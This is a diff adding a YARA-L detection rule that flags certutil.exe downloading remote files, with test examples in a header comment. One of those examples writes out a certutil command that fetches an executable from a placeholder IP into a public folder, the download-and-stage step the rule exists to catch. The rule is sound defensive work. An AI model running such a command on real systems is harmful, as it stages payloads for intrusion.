@@ -1,0 +1,40 @@
+// Shape: single event
+// Logic: Alert when certutil.exe runs with -urlcache and a URL on the command line.
+//
+// Should fire:   certutil.exe -urlcache -split -f http://203.0.113.10/a.exe C:\Users\Public\a.exe
+// Should not:    certutil.exe -hashfile C:\temp\installer.msi SHA256
+
+rule win_certutil_remote_download {
+
+  meta:
+    author = "community"
+    description = "certutil.exe used to download a remote file, a common living off the land technique for staging payloads."
+    severity = "HIGH"
+    priority = "HIGH"
+    mitre_attack_tactic = "Command and Control"
+    mitre_attack_technique = "T1105"
+    reference = "https://attack.mitre.org/techniques/T1105/"
+    false_positives = "Legacy admin scripts that fetch certificates or CRLs over HTTP."
+    rule_version = "1.0"
+    yara_version = "YL2.0"
+
+  events:
+    $e.metadata.event_type = "PROCESS_LAUNCH"
+    re.regex($e.target.process.file.full_path, `(?i)\\certutil\.exe$`)
+    // Both the download switch and a URL must be present; -urlcache alone is used to clear the cache.
+    re.regex($e.target.process.command_line, `(?i)[-/]urlcache`)
+    re.regex($e.target.process.command_line, `(?i)https?://`)
+    // Tuning hook: hosts with approved certificate maintenance scripts.
+    not $e.principal.hostname in %certutil_allowed_hosts
+
+  outcome:
+    $risk_score = 70
+    $risk_entity_to_score = $e.principal.hostname
+    $hostname = $e.principal.hostname
+    $user = $e.principal.user.userid
+    $command_line = $e.target.process.command_line
+    $parent_process = $e.principal.process.file.full_path
+
+  condition:
+    $e
+}
